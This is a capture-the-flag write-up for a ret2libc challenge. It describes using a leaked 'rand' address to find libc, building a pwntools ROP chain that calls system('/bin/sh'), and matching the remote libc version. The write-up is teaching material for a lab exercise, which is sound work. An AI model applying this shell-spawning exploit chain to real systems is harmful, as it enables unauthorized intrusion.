# RET2LIBC

## Solution


Initially from the binary I can see that there is No PIE
```
/root/workspace/ret2libc/chal.bin
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
When I run the binary on its own, I notice that there is a leaked address for the function 'rand' present. This gives me a very easy way of calculating the offset of libc.

However, when looking for gadgets, I notice that there are no 'pop rdi' gadgets present in the binary. This is not that big of a deal because we can just use the libc gadgets.

```
chain = cyclic(16)
chain += p64(rlibc.find_gadget(['ret'])[0])
chain += p64(rlibc.find_gadget(['pop rdi','ret'])[0])
chain += p64(next(libc.search(b'/bin/sh')))
chain += p64(libc.sym['system'])
```

One problem that I encountered was 'movaps' which was an easy solve by adding an extra 'ret' gadget. 

To perform this remotely, I had to use the address of the remote 'rand' function. I had to look up the offsets on the libc database and then had to try out the different versions of libc that had 'rand' at this offset. Once I found the correct version, I would load this version locally to perform the attack remotely.